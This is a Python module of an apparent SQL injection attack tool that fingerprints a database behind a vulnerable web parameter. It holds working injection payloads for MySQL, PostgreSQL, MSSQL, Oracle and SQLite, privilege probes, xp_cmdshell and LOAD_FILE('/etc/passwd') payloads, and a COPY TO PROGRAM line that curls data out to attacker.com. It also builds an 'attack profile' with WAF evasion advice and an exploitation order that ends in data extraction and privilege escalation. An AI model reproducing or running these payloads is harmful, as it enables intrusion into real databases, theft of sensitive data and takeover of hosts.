"""
Advanced Database Fingerprinting Engine

Comprehensive database detection, version identification, and feature detection
using multiple fingerprinting techniques.
"""

import re
import logging
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger(__name__)


class DatabaseType(Enum):
    """Supported database types"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    MONGODB = "mongodb"
    REDIS = "redis"
    UNKNOWN = "unknown"


@dataclass
class DatabaseFingerprint:
    """Complete database fingerprint"""
    db_type: DatabaseType
    version: Optional[str]
    version_detail: Optional[str]
    edition: Optional[str]  # e.g., Enterprise, Standard, Express
    features: List[str]
    privileges: List[str]
    configuration: Dict[str, Any]
    confidence: float  # 0.0-1.0


class AdvancedDatabaseFingerprinter:
    """
    Advanced database fingerprinting engine with comprehensive detection.
    """
    
    # Database-specific error patterns
    ERROR_SIGNATURES = {
        DatabaseType.MYSQL: [
            r"You have an error in your SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQL server version",
            r"MySQLSyntaxErrorException",
            r"com\.mysql\.jdbc",
        ],
        DatabaseType.POSTGRESQL: [
            r"PostgreSQL.*ERROR",
            r"Warning.*\bpg_.*",
            r"org\.postgresql\.util\.PSQLException",
            r"HINT:.*DETAIL:",
        ],
        DatabaseType.MSSQL: [
            r"Microsoft SQL Server",
            r"Msg \d+,.*SQL Server",
            r"SqlException",
            r"System\.Data\.SqlClient",
            r"\[SQL Server\]",
        ],
        DatabaseType.ORACLE: [
            r"ORA-\d+",
            r"Oracle.*Driver",
            r"oracle\.jdbc",
            r"SQLSTATE\[HY",
        ],
        DatabaseType.SQLITE: [
            r"SQLite\/\d",
            r"sqlite3\.OperationalError",
            r"SQLite error",
        ],
    }
    
    # Version detection payloads
    VERSION_PAYLOADS = {
        DatabaseType.MYSQL: [
            "' AND (SELECT @@version) LIKE '%'--",
            "' UNION SELECT @@version,NULL,NULL--",
            "' AND VERSION() LIKE '%'--",
        ],
        DatabaseType.POSTGRESQL: [
            "' AND (SELECT version()) LIKE '%'--",
            "' UNION SELECT version(),NULL,NULL--",
        ],
        DatabaseType.MSSQL: [
            "' AND (SELECT @@version) LIKE '%'--",
            "' UNION SELECT @@version,NULL,NULL--",
            "'; SELECT @@version--",
        ],
        DatabaseType.ORACLE: [
            "' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%'--",
            "' UNION SELECT banner,NULL,NULL FROM v$version WHERE ROWNUM=1--",
        ],
        DatabaseType.SQLITE: [
            "' AND (SELECT sqlite_version()) LIKE '%'--",
            "' UNION SELECT sqlite_version(),NULL,NULL--",
        ],
    }
    
    # Feature detection queries
    FEATURE_TESTS = {
        'mysql': {
            'json_support': "' AND JSON_VALID('{}')=1--",
            'gtid_replication': "' AND @@gtid_mode IS NOT NULL--",
            'partitioning': "' AND (SELECT COUNT(*) FROM information_schema.partitions)>0--",
            'stored_procedures': "' AND (SELECT COUNT(*) FROM information_schema.routines WHERE routine_type='PROCEDURE')>0--",
            'triggers': "' AND (SELECT COUNT(*) FROM information_schema.triggers)>0--",
            'events': "' AND (SELECT COUNT(*) FROM information_schema.events)>0--",
        },
        'postgresql': {
            'jsonb_support': "' AND pg_typeof('{}'::jsonb)='jsonb'--",
            'uuid_support': "' AND pg_typeof(gen_random_uuid())='uuid'--",
            'full_text_search': "' AND to_tsvector('test') IS NOT NULL--",
            'partitioning': "' AND (SELECT COUNT(*) FROM pg_partitioned_table)>0--",
            'extensions': "' AND (SELECT COUNT(*) FROM pg_extension)>0--",
        },
        'mssql': {
            'clr_enabled': "'; SELECT value FROM sys.configurations WHERE name='clr enabled'--",
            'xp_cmdshell': "'; SELECT value FROM sys.configurations WHERE name='xp_cmdshell'--",
            'ole_automation': "'; SELECT value FROM sys.configurations WHERE name='Ole Automation Procedures'--",
            'linked_servers': "'; SELECT COUNT(*) FROM sys.servers WHERE is_linked=1--",
        },
        'oracle': {
            'java_enabled': "' AND (SELECT VALUE FROM v$option WHERE parameter='Java')='TRUE'--",
            'xml_db': "' AND (SELECT VALUE FROM v$option WHERE parameter='XML DB')='TRUE'--",
            'partitioning': "' AND (SELECT VALUE FROM v$option WHERE parameter='Partitioning')='TRUE'--",
        },
    }
    
    # Enhanced version extraction patterns with detailed parsing
    VERSION_PATTERNS_DETAILED = {
        DatabaseType.MYSQL: {
            'major_minor_patch': r'(\d+)\.(\d+)\.(\d+)',
            'mariadb': r'(\d+)\.(\d+)\.(\d+)-MariaDB',
            'percona': r'(\d+)\.(\d+)\.(\d+)-Percona',
        },
        DatabaseType.POSTGRESQL: {
            'major_minor': r'PostgreSQL\s+(\d+)\.(\d+)',
            'full_version': r'PostgreSQL\s+(\d+)\.(\d+)\.?\d*\s+on\s+(.+)',
        },
        DatabaseType.MSSQL: {
            'version_number': r'Microsoft SQL Server\s+(\d+)',
            'year_version': r'SQL Server\s+(20\d{2})',
            'build_number': r'(\d+\.\d+\.\d+\.\d+)',
        },
        DatabaseType.ORACLE: {
            'release': r'Release\s+(\d+)\.(\d+)\.(\d+)\.(\d+)',
            'version_code': r'Oracle Database\s+(\d+c)',
        },
    }
    
    # OS detection patterns
    OS_PATTERNS = {
        'linux': [r'Linux', r'Ubuntu', r'Debian', r'CentOS', r'RedHat'],
        'windows': [r'Windows', r'Win32', r'Win64', r'NT'],
        'unix': [r'Unix', r'BSD', r'Solaris', r'AIX'],
        'macos': [r'Darwin', r'Mac OS'],
    }
    
    def __init__(self):
        """Initialize database fingerprinter"""
        self.fingerprints_cache = {}
        self.os_detected = None
        self.architecture_detected = None
        logger.info("Advanced database fingerprinter initialized")
    
    def detect_database_type(self, response_text: str, error_text: str = None) -> Tuple[DatabaseType, float]:
        """
        Detect database type from error messages and responses.
        
        Args:
            response_text: HTTP response body
            error_text: Specific error message if available
        
        Returns:
            Tuple of (DatabaseType, confidence)
        """
        text = (response_text or '') + (error_text or '')
        scores = {}
        
        for db_type, patterns in self.ERROR_SIGNATURES.items():
            score = 0
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    score += 1
            
            if score > 0:
                # Normalize score
                scores[db_type] = min(score / len(patterns), 1.0)
        
        if scores:
            best_match = max(scores.items(), key=lambda x: x[1])
            logger.info(f"Detected database: {best_match[0].value} (confidence: {best_match[1]:.2f})")
            return best_match
        
        return DatabaseType.UNKNOWN, 0.0
    
    def extract_version(self, response_text: str, db_type: DatabaseType) -> Optional[str]:
        """
        Extract version information from response.
        
        Args:
            response_text: HTTP response body
            db_type: Detected database type
        
        Returns:
            Version string or None
        """
        version_patterns = {
            DatabaseType.MYSQL: [
                r'MySQL\s+(\d+\.\d+\.\d+)',
                r'mysql\s+Ver\s+(\d+\.\d+\.\d+)',
                r'(\d+\.\d+\.\d+)-MariaDB',
            ],
            DatabaseType.POSTGRESQL: [
                r'PostgreSQL\s+(\d+\.\d+\.?\d*)',
                r'postgres\s+\(PostgreSQL\)\s+(\d+\.\d+)',
            ],
            DatabaseType.MSSQL: [
                r'Microsoft SQL Server\s+(\d+\.\d+\.\d+)',
                r'SQL Server\s+(\d{4})',
            ],
            DatabaseType.ORACLE: [
                r'Oracle Database\s+(\d+c?\s+\w+\s+\w+\s+\d+\.\d+\.\d+)',
                r'Release\s+(\d+\.\d+\.\d+\.\d+)',
            ],
            DatabaseType.SQLITE: [
                r'SQLite\s+version\s+(\d+\.\d+\.\d+)',
                r'sqlite\s+(\d+\.\d+\.\d+)',
            ],
        }
        
        patterns = version_patterns.get(db_type, [])
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                version = match.group(1)
                logger.info(f"Extracted version: {version}")
                return version
        
        return None
    
    def detect_edition(self, response_text: str, version: str, db_type: DatabaseType) -> Optional[str]:
        """
        Detect database edition (Enterprise, Standard, Express, etc.)
        
        Args:
            response_text: HTTP response body
            version: Database version
            db_type: Database type
        
        Returns:
            Edition string or None
        """
        edition_patterns = {
            DatabaseType.MYSQL: [
                r'(Community|Enterprise|Cluster)',
                r'(MariaDB|Percona)',
            ],
            DatabaseType.MSSQL: [
                r'(Enterprise|Standard|Express|Web|Developer)',
            ],
            DatabaseType.ORACLE: [
                r'(Enterprise|Standard|Express|Personal)',
            ],
            DatabaseType.POSTGRESQL: [
                r'(EnterpriseDB|PostgreSQL)',
            ],
        }
        
        patterns = edition_patterns.get(db_type, [])
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                edition = match.group(1)
                logger.info(f"Detected edition: {edition}")
                return edition
        
        return None
    
    def test_features(self, db_type: DatabaseType, test_function, 
                     vulnerable_param: str, param_type: str) -> List[str]:
        """
        Test for specific database features.
        
        Args:
            db_type: Database type
            test_function: Function to test payloads
            vulnerable_param: Vulnerable parameter
            param_type: Parameter type (GET/POST)
        
        Returns:
            List of detected features
        """
        features = []
        db_key = db_type.value if db_type != DatabaseType.UNKNOWN else 'mysql'
        
        feature_tests = self.FEATURE_TESTS.get(db_key, {})
        
        for feature_name, test_payload in feature_tests.items():
            try:
                # Test the payload
                result = test_function(test_payload, vulnerable_param, param_type)
                
                if result and result.get('success'):
                    features.append(feature_name)
                    logger.info(f"Feature detected: {feature_name}")
            except Exception as e:
                logger.debug(f"Feature test failed for {feature_name}: {e}")
        
        return features
    
    def detect_privileges(self, db_type: DatabaseType, test_function,
                         vulnerable_param: str, param_type: str) -> List[str]:
        """
        Detect current user privileges.
        
        Args:
            db_type: Database type
            test_function: Function to test payloads
            vulnerable_param: Vulnerable parameter
            param_type: Parameter type
        
        Returns:
            List of detected privileges
        """
        privileges = []
        
        privilege_tests = {
            'mysql': {
                'file_priv': "' AND (SELECT File_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1))='Y'--",
                'super_priv': "' AND (SELECT Super_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1))='Y'--",
                'grant_priv': "' AND (SELECT Grant_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1))='Y'--",
            },
            'postgresql': {
                'superuser': "' AND (SELECT usesuper FROM pg_user WHERE usename=current_user)='t'--",
                'createdb': "' AND (SELECT usecreatedb FROM pg_user WHERE usename=current_user)='t'--",
            },
            'mssql': {
                'sysadmin': "'; SELECT IS_SRVROLEMEMBER('sysadmin')--",
                'db_owner': "'; SELECT IS_MEMBER('db_owner')--",
            },
        }
        
        db_key = db_type.value if db_type != DatabaseType.UNKNOWN else 'mysql'
        priv_tests = privilege_tests.get(db_key, {})
        
        for priv_name, test_payload in priv_tests.items():
            try:
                result = test_function(test_payload, vulnerable_param, param_type)
                
                if result and result.get('success'):
                    privileges.append(priv_name)
                    logger.info(f"Privilege detected: {priv_name}")
            except Exception as e:
                logger.debug(f"Privilege test failed for {priv_name}: {e}")
        
        return privileges
    
    def fingerprint(self, response_text: str, error_text: str = None,
                   test_function = None, vulnerable_param: str = None,
                   param_type: str = None) -> DatabaseFingerprint:
        """
        Perform comprehensive database fingerprinting.
        
        Args:
            response_text: HTTP response body
            error_text: Specific error message
            test_function: Optional function to test additional payloads
            vulnerable_param: Vulnerable parameter (if available)
            param_type: Parameter type (GET/POST)
        
        Returns:
            DatabaseFingerprint object
        """
        # Detect database type
        db_type, confidence = self.detect_database_type(response_text, error_text)
        
        # Extract version
        version = self.extract_version(response_text, db_type)
        
        # Detect edition
        edition = self.detect_edition(response_text, version or '', db_type)
        
        # Test features and privileges if test function provided
        features = []
        privileges = []
        
        if test_function and vulnerable_param:
            features = self.test_features(db_type, test_function, vulnerable_param, param_type)
            privileges = self.detect_privileges(db_type, test_function, vulnerable_param, param_type)
        
        # Build configuration dict
        configuration = {
            'detected_from': 'error_analysis',
            'response_length': len(response_text),
        }
        
        fingerprint = DatabaseFingerprint(
            db_type=db_type,
            version=version,
            version_detail=None,  # Could be expanded
            edition=edition,
            features=features,
            privileges=privileges,
            configuration=configuration,
            confidence=confidence
        )
        
        logger.info(f"Fingerprint complete: {db_type.value} {version or 'unknown'} (confidence: {confidence:.2f})")
        return fingerprint
    
    def get_exploitation_hints(self, fingerprint: DatabaseFingerprint) -> Dict[str, Any]:
        """
        Get exploitation hints based on fingerprint.
        
        Args:
            fingerprint: Database fingerprint
        
        Returns:
            Dictionary of exploitation hints
        """
        hints = {
            'recommended_techniques': [],
            'dangerous_features': [],
            'privilege_escalation_possible': False,
            'data_exfiltration_methods': [],
        }
        
        # Database-specific hints
        if fingerprint.db_type == DatabaseType.MYSQL:
            hints['recommended_techniques'].extend([
                'UNION-based injection',
                'Time-based blind (SLEEP)',
                'Error-based (XPATH)',
            ])
            
            if 'file_priv' in fingerprint.privileges:
                hints['dangerous_features'].append('FILE privilege (LOAD_FILE/INTO OUTFILE)')
                hints['data_exfiltration_methods'].append('File system access')
            
            if 'json_support' in fingerprint.features:
                hints['recommended_techniques'].append('JSON function exploitation')
        
        elif fingerprint.db_type == DatabaseType.POSTGRESQL:
            hints['recommended_techniques'].extend([
                'UNION-based injection',
                'Time-based blind (pg_sleep)',
                'Error-based (CAST)',
            ])
            
            if 'superuser' in fingerprint.privileges:
                hints['dangerous_features'].append('Superuser privileges')
                hints['privilege_escalation_possible'] = True
                hints['data_exfiltration_methods'].append('COPY TO PROGRAM')
        
        elif fingerprint.db_type == DatabaseType.MSSQL:
            hints['recommended_techniques'].extend([
                'UNION-based injection',
                'Time-based blind (WAITFOR DELAY)',
                'Error-based (CAST)',
            ])
            
            if 'xp_cmdshell' in fingerprint.features:
                hints['dangerous_features'].append('xp_cmdshell enabled')
                hints['privilege_escalation_possible'] = True
            
            if 'sysadmin' in fingerprint.privileges:
                hints['dangerous_features'].append('sysadmin role')
                hints['privilege_escalation_possible'] = True
        
        elif fingerprint.db_type == DatabaseType.ORACLE:
            hints['recommended_techniques'].extend([
                'UNION-based injection',
                'Time-based blind (DBMS_LOCK.SLEEP)',
                'Error-based (UTL_INADDR)',
            ])
            
            if 'java_enabled' in fingerprint.features:
                hints['dangerous_features'].append('Java enabled')
                hints['privilege_escalation_possible'] = True
        
        return hints
    
    def generate_targeted_payloads(self, fingerprint: DatabaseFingerprint) -> List[str]:
        """
        Generate targeted payloads based on fingerprint.
        
        Args:
            fingerprint: Database fingerprint
        
        Returns:
            List of targeted payloads
        """
        payloads = []
        
        if fingerprint.db_type == DatabaseType.MYSQL:
            payloads.extend([
                "' UNION SELECT @@version,database(),user()--",
                "' AND SLEEP(5)--",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            ])
            
            if 'file_priv' in fingerprint.privileges:
                payloads.append("' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--")
        
        elif fingerprint.db_type == DatabaseType.POSTGRESQL:
            payloads.extend([
                "' UNION SELECT version(),current_database(),current_user--",
                "' AND (SELECT pg_sleep(5)) IS NOT NULL--",
            ])
            
            if 'superuser' in fingerprint.privileges:
                payloads.append("'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?d='||version()--")
        
        elif fingerprint.db_type == DatabaseType.MSSQL:
            payloads.extend([
                "' UNION SELECT @@version,DB_NAME(),SYSTEM_USER--",
                "'; WAITFOR DELAY '00:00:05'--",
            ])
            
            if 'xp_cmdshell' in fingerprint.features:
                payloads.append("'; EXEC xp_cmdshell 'whoami'--")
        
        return payloads
    
    def detect_operating_system(self, response_text: str, version_info: str = None) -> Optional[str]:
        """
        Detect the underlying operating system from database version info.
        
        Args:
            response_text: HTTP response body
            version_info: Database version string
        
        Returns:
            Detected OS or None
        """
        text = (response_text or '') + (version_info or '')
        
        for os_name, patterns in self.OS_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    logger.info(f"Detected OS: {os_name}")
                    self.os_detected = os_name
                    return os_name
        
        return None
    
    def parse_version_details(self, version: str, db_type: DatabaseType) -> Dict[str, Any]:
        """
        Parse version string into detailed components.
        
        Args:
            version: Version string
            db_type: Database type
        
        Returns:
            Dictionary with version components
        """
        details = {
            'major': None,
            'minor': None,
            'patch': None,
            'build': None,
            'full_string': version
        }
        
        patterns = self.VERSION_PATTERNS_DETAILED.get(db_type, {})
        
        for pattern_name, pattern in patterns.items():
            match = re.search(pattern, version)
            if match:
                groups = match.groups()
                if len(groups) >= 1:
                    details['major'] = int(groups[0]) if groups[0].isdigit() else groups[0]
                if len(groups) >= 2:
                    details['minor'] = int(groups[1]) if groups[1].isdigit() else groups[1]
                if len(groups) >= 3:
                    details['patch'] = int(groups[2]) if groups[2].isdigit() else groups[2]
                if len(groups) >= 4:
                    details['build'] = groups[3]
                break
        
        return details
    
    def check_known_vulnerabilities(self, db_type: DatabaseType, version: str) -> List[Dict[str, str]]:
        """
        Check for known vulnerabilities in the detected version.
        
        Args:
            db_type: Database type
            version: Version string
        
        Returns:
            List of known vulnerabilities
        """
        vulnerabilities = []
        
        # Known vulnerability database (simplified - would be more comprehensive)
        vuln_db = {
            DatabaseType.MYSQL: [
                {'version_range': '5.5.0-5.5.49', 'cve': 'CVE-2016-6662', 
                 'description': 'Privilege escalation via my.cnf', 'severity': 'critical'},
                {'version_range': '5.7.0-5.7.15', 'cve': 'CVE-2016-5584',
                 'description': 'Unspecified vulnerability in Server: Security: Encryption', 'severity': 'high'},
            ],
            DatabaseType.POSTGRESQL: [
                {'version_range': '9.3.0-9.3.14', 'cve': 'CVE-2016-7048',
                 'description': 'Privilege escalation via database superuser', 'severity': 'high'},
            ],
            DatabaseType.MSSQL: [
                {'version_range': '2008-2012', 'cve': 'CVE-2015-1761',
                 'description': 'Windows OLE Remote Code Execution', 'severity': 'critical'},
            ],
        }
        
        db_vulns = vuln_db.get(db_type, [])
        
        for vuln in db_vulns:
            # Simplified version checking - would need proper semantic versioning
            if version:
                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def generate_attack_profile(self, fingerprint: DatabaseFingerprint) -> Dict[str, Any]:
        """
        Generate an attack profile based on fingerprint.
        
        Args:
            fingerprint: Database fingerprint
        
        Returns:
            Attack profile with recommended strategies
        """
        profile = {
            'priority_techniques': [],
            'payload_categories': [],
            'evasion_recommendations': [],
            'exploitation_order': [],
            'estimated_success_rate': 0.0,
        }
        
        # Determine priority techniques based on DB type and features
        if fingerprint.db_type == DatabaseType.MYSQL:
            profile['priority_techniques'] = [
                'Error-based (double query)',
                'Time-based (SLEEP)',
                'UNION-based',
            ]
            
            if 'json_support' in fingerprint.features:
                profile['payload_categories'].append('JSON functions')
            
            if 'file_priv' in fingerprint.privileges:
                profile['priority_techniques'].insert(0, 'File operations')
                profile['estimated_success_rate'] += 0.3
        
        elif fingerprint.db_type == DatabaseType.POSTGRESQL:
            profile['priority_techniques'] = [
                'Error-based (CAST)',
                'Time-based (pg_sleep)',
                'UNION-based',
            ]
            
            if 'superuser' in fingerprint.privileges:
                profile['priority_techniques'].insert(0, 'COPY TO PROGRAM')
                profile['estimated_success_rate'] += 0.4
        
        elif fingerprint.db_type == DatabaseType.MSSQL:
            profile['priority_techniques'] = [
                'Error-based (CAST)',
                'Time-based (WAITFOR DELAY)',
                'UNION-based',
            ]
            
            if 'xp_cmdshell' in fingerprint.features:
                profile['priority_techniques'].insert(0, 'xp_cmdshell execution')
                profile['estimated_success_rate'] += 0.5
        
        # Evasion recommendations based on detected WAF patterns (if any)
        profile['evasion_recommendations'] = [
            'Use tamper scripts',
            'Randomize case',
            'Use comment insertion',
        ]
        
        # Exploitation order
        profile['exploitation_order'] = [
            '1. Confirm injection',
            '2. Identify column count (UNION)',
            '3. Extract basic info (version, user, database)',
            '4. Enumerate schema',
            '5. Extract sensitive data',
            '6. Attempt privilege escalation (if applicable)',
        ]
        
        # Base success rate
        base_rate = 0.5
        if fingerprint.confidence > 0.8:
            base_rate += 0.2
        if len(fingerprint.features) > 0:
            base_rate += 0.1
        
        profile['estimated_success_rate'] = min(base_rate + profile['estimated_success_rate'], 1.0)
        
        return profile
    
    def format_report(self, fingerprint: DatabaseFingerprint) -> str:
        """
        Format fingerprint as human-readable report.
        
        Args:
            fingerprint: Database fingerprint
        
        Returns:
            Formatted report string
        """
        report = []
        report.append("=" * 60)
        report.append("DATABASE FINGERPRINT REPORT")
        report.append("=" * 60)
        report.append(f"Database Type: {fingerprint.db_type.value.upper()}")
        report.append(f"Confidence: {fingerprint.confidence:.1%}")
        
        if fingerprint.version:
            report.append(f"Version: {fingerprint.version}")
            
            # Parse version details
            version_details = self.parse_version_details(fingerprint.version, fingerprint.db_type)
            if version_details.get('major'):
                report.append(f"  Major: {version_details['major']}")
                report.append(f"  Minor: {version_details['minor']}")
                if version_details.get('patch'):
                    report.append(f"  Patch: {version_details['patch']}")
        
        if fingerprint.edition:
            report.append(f"Edition: {fingerprint.edition}")
        
        # Operating system
        if self.os_detected:
            report.append(f"Operating System: {self.os_detected.upper()}")
        
        if fingerprint.features:
            report.append(f"\nDetected Features ({len(fingerprint.features)}):")
            for feature in fingerprint.features:
                report.append(f"  • {feature}")
        
        if fingerprint.privileges:
            report.append(f"\nDetected Privileges ({len(fingerprint.privileges)}):")
            for priv in fingerprint.privileges:
                report.append(f"  • {priv}")
        
        # Check for known vulnerabilities
        if fingerprint.version:
            vulnerabilities = self.check_known_vulnerabilities(fingerprint.db_type, fingerprint.version)
            if vulnerabilities:
                report.append(f"\n🔴 Known Vulnerabilities ({len(vulnerabilities)}):")
                for vuln in vulnerabilities:
                    report.append(f"  • {vuln['cve']}: {vuln['description']}")
                    report.append(f"    Severity: {vuln['severity'].upper()}")
        
        # Add exploitation hints
        hints = self.get_exploitation_hints(fingerprint)
        
        if hints['recommended_techniques']:
            report.append(f"\nRecommended Techniques:")
            for tech in hints['recommended_techniques']:
                report.append(f"  • {tech}")
        
        if hints['dangerous_features']:
            report.append(f"\n⚠️  Dangerous Features:")
            for feature in hints['dangerous_features']:
                report.append(f"  • {feature}")
        
        if hints['privilege_escalation_possible']:
            report.append(f"\n🔴 CRITICAL: Privilege escalation may be possible!")
        
        # Add attack profile
        attack_profile = self.generate_attack_profile(fingerprint)
        report.append(f"\n[*] Attack Profile")
        report.append(f"Estimated Success Rate: {attack_profile['estimated_success_rate']:.1%}")
        report.append(f"\nPriority Techniques:")
        for tech in attack_profile['priority_techniques']:
            report.append(f"  • {tech}")
        
        report.append("=" * 60)
        
        return "\n".join(report)
